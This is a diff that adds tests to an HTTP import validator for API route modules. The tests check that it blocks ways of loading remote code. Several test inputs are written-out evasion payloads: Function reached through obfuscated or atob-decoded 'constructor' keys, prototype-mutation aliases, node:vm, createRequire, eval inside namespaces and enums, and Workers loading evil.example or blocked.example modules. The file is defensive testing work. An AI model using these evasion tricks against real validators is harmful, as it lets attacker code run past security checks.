@@ -618,6 +618,116 @@ describe("routing/api/module-loader/http-validator", () => {
       );
     });
 
+    it("should reject a computed property read this analysis cannot resolve on a callable", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const fn = () => {}; const key = ["con", "structor"].join("");` +
+              ` const make = fn[key];` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an undecidable computed key on a function may spell constructor and reach Function",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `function helper() {} const key = atob("Y29uc3RydWN0b3I=");` +
+              ` helper[key]('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a function declaration binding carries the same constructor property",
+      );
+      await validateHTTPImports(
+        `const table = { safe: "ok" }; const key = computeKey();` +
+          ` export const GET = () => new Response(String(table[key]));`,
+        [],
+      );
+    });
+
+    it("should track prototype mutations through aliases of Object and Reflect", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const O = Object; const holder = {}; O.setPrototypeOf(holder, () => {});` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an alias of Object reaches the same prototype mutator",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const R = Reflect; const holder = {};` +
+              ` R.set(holder, "__proto__", () => {});` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an alias of Reflect reaches the same prototype setter",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const holder = {}; globalThis.Object.setPrototypeOf(holder, () => {});` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "Object read off the global object is the same prototype mutator",
+      );
+    });
+
+    it("should reject imports of runtime modules that evaluate source text", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `import { runInThisContext } from "node:vm";` +
+              ` runInThisContext('new Worker("https://blocked.example/mod.js", { type: "module" })');`,
+            [],
+          ),
+        Error,
+        "code evaluation",
+        "node:vm evaluates strings this validator can never scan as code",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const vm = await import("node:vm"); export const GET = () => new Response(String(vm));`,
+            [],
+          ),
+        Error,
+        "code evaluation",
+        "a dynamic import reaches the same evaluator",
+      );
+    });
+
+    it("should reject imports of runtime module loaders such as createRequire", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `import { createRequire } from "node:module";` +
+              ` const require = createRequire(import.meta.url);` +
+              ` export const value = require("./helper.cjs");`,
+            [],
+          ),
+        Error,
+        "createRequire",
+        "a createRequire load never appears in the module graph this validator walks",
+      );
+    });
+
     it("should not treat erased TypeScript declarations as runtime bindings", async () => {
       await assertRejects(
         async () =>
@@ -639,6 +749,56 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "Worker",
         "a declare binding is erased and cannot shadow the global Worker constructor",
+      );
+    });
+
+    it("should treat namespace bodies and enum members as executable code", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `namespace RouteNs { eval('import("https://blocked.example/mod.js")'); }`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a namespace body compiles to executable JavaScript, not to an erased type",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `namespace RouteNs {` +
+              ` export const w = new Worker("https://blocked.example/mod.js", { type: "module" });` +
+              ` }`,
+            [],
+          ),
+        Error,
+        "Worker",
+        "a remote worker inside a namespace starts exactly as one at the top level does",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `namespace RouteNs { export const load = (u: string) => import(u); }`,
+            [],
+          ),
+        Error,
+        "unconstrained dynamic import",
+        "a dynamic import inside a namespace escapes no differently",
+      );
+      await assertRejects(
+        async () => await validateHTTPImports(`enum RouteEnum { A = eval("1") }`, []),
+        Error,
+        "dynamic code generation",
+        "a computed enum member initializer executes at module evaluation",
+      );
+      // Ambient declarations stay erased, and ordinary namespace and enum
+      // values keep loading.
+      await validateHTTPImports(
+        `declare namespace Ambient { const value: number; }` +
+          ` namespace SafeNs { export const value = 1; }` +
+          ` enum SafeEnum { A = 1, B = A * 2 }` +
+          ` export const GET = () => new Response(String(SafeNs.value + SafeEnum.B));`,
+        [],
       );
     });
 
@@ -765,6 +925,29 @@ describe("routing/api/module-loader/http-validator", () => {
       );
     });
 
+    it("should classify a Worker constructor assigned in the construction itself", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `new (W = Worker)("https://blocked.example/mod.js", { type: "module" });`,
+            [],
+          ),
+        Error,
+        "Worker",
+        "an assignment expression callee evaluates to its right-hand side, the Worker loader",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `let W; new (W = Worker)("https://blocked.example/mod.js", { type: "module" });`,
+            [],
+          ),
+        Error,
+        "Worker",
+        "a declared assignment target must not hide the construction either",
+      );
+    });
+
     it("should fail closed on Worker aliases when the capability parser is unavailable", async () => {
       __setSourceCapabilityParserLoaderForTests(() =>
         Promise.reject(new Error("parser unavailable"))
@@ -879,6 +1062,36 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "Worker",
       );
+    });
+
+    it("should fail closed on literal worker bases the textual scanner does not resolve", async () => {
+      __setSourceCapabilityParserLoaderForTests(() =>
+        Promise.reject(new Error("parser unavailable"))
+      );
+      try {
+        await assertRejects(
+          async () =>
+            await validateHTTPImports(
+              `new Worker(new URL("./mod.js", " https://evil.example/base/"), { type: "module" });`,
+              [],
+            ),
+          Error,
+          "Worker",
+          "the URL constructor trims the base and fetches remotely, so a padded base must not scan as local",
+        );
+        await assertRejects(
+          async () =>
+            await validateHTTPImports(
+              `new Worker(new URL("./mod.js", "./base/"), { type: "module" });`,
+              [],
+            ),
+          Error,
+          "Worker",
+          "a relative base names an entry no graph walk can vet and must not pass validation",
+        );
+      } finally {
+        __setSourceCapabilityParserLoaderForTests();
+      }
     });
 
     it("should record only the worker entries whose base resolves against this module", async () => {
@@ -1121,6 +1334,19 @@ describe("routing/api/module-loader/http-validator", () => {
           requiresBundling: false,
           hasDynamicCodeGeneration: false,
         },
+      );
+    });
+
+    it("should fail closed when a template literal never terminates", () => {
+      // An unterminated template swallows the rest of the file, so the scan
+      // cannot claim the hidden text names no unconstrained import.
+      const scan = scanModuleSpecifiers(
+        "const tail = `never closed\nimport(target);",
+      );
+      assertEquals(
+        scan.hasUnconstrainedDynamicImport,
+        true,
+        "an unreadable template must not yield a scan that reports no unconstrained import",
       );
     });
 
